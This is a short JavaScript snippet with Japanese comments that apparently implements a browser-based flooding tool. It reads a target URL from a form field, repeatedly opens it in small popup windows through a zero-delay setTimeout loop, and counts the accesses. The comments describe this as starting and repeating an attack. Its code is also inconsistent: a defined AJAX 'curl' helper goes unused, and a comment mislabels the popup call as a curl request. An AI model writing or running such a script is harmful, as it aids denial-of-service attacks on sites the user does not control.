// 接続回数をリセット
var kaisuu = 0;

// AJAXを使ってcurlリクエストを送る関数
function curl(url) {
  $.ajax({
    url: url,
    beforeSend: function (xhr) {
      // 必要ならヘッダーを設定する
    },
    success: function (data) {
      // 必要ならレスポンスデータを処理する
    },
  });
}

// 攻撃を開始する関数
function attack() {
  // 入力フィールドからターゲットURLを取得する
  var target = $("#target").val();

  // ターゲットが有効かチェックする
  if (target) {
    // 接続回数を増やして表示する
    kaisuu++;
    $("#count").text(kaisuu + "回目のアクセス");

    // ターゲットにcurlリクエストを送る
    window.open(target,null,'top=0,left=0,width=100,height=100');;

    // 攻撃を繰り返す
    setTimeout(attack, 0);
  }
}
